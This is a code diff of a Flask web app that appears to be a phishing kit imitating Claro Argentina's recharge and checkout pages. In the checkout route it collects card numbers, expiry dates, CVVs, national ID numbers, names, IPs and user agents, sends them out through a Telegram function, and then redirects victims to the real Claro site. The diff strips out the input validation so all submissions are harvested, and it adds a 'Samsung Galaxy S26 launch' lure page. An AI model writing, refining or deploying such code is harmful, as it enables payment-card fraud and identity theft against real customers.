@@ -110,27 +110,16 @@ def checkout():
 
         else:
         
-            primeros_6_digitos = numcc[:6]
-
-            # 3. Lógica de comparación
-            if primeros_6_digitos in PREFIJOS_VALIDOS:
-
-                print(primeros_6_digitos)
-                info_date = customer_date(dni)
+            info_date = customer_date(dni)
 
 
-                ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
-                user_agent = request.headers.get('User-Agent')
+            ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
+            user_agent = request.headers.get('User-Agent')
 
 
-                enviar_telegram(numcc, exp, cvv, dni, name, info_date, ip, user_agent)
-                return redirect("https://simple.claro.com.ar/inicio/auth/pin")
-            else:
-                
-                mensaje_error = 'El número de tarjeta no es válido.'
-                
-                print(mensaje_error)
-                return render_template('checkout.html', error=mensaje_error)
+            enviar_telegram(numcc, exp, cvv, dni, name, info_date, ip, user_agent)
+            return redirect("https://simple.claro.com.ar/inicio/auth/pin")
+
             
     # Si el usuario recién entra a la página (GET)
     return render_template('checkout.html', error=None, mensaje_error_cvv=None, telefono_previo="")
@@ -148,26 +137,22 @@ def home():
         telefono_ingresado = request.form.get('number')
         print(telefono_ingresado) # Para debugear en tu consola
 
-        # Validamos el número
-        if num_validator(telefono_ingresado, 'functions/nums.txt'):
-            # ¡Éxito! 
-            number_line = telefono_ingresado.replace(" ", "")
-            session['number_user'] = number_line
-            
-            # CAMBIO CLAVE: Usar redirect y url_for (asegurate de que la función se llame exactamente 'recharge_line')
-            return redirect(url_for('recharge_line')) 
-        else:
-            # ¡Error! 
-            mensaje_error = "La línea no es válida. Ingresa tu código de área y tu línea sin el 15."
-            
-            # CAMBIO CLAVE: Le devolvemos 'telefono_previo' para que no pierda lo que tipeó
-            return render_template('index.html', error=mensaje_error)
+        number_line = telefono_ingresado.replace(" ", "")
+        session['number_user'] = number_line
+        
+        # CAMBIO CLAVE: Usar redirect y url_for (asegurate de que la función se llame exactamente 'recharge_line')
+        return redirect(url_for('recharge_line')) 
+   
 
     # Si el usuario recién entra a la página (GET)
     return render_template('index.html', error=None, telefono_previo="")
 
-    
+@app.route('/lanzamiento-samsung-galaxy-s26')
+def oferta():
 
+    return render_template('oferta.html')
+
+    
 @app.route('/recharge-amounts-view' )
 def recharge_line():
     # render_template busca automáticamente en la carpeta 'templates'
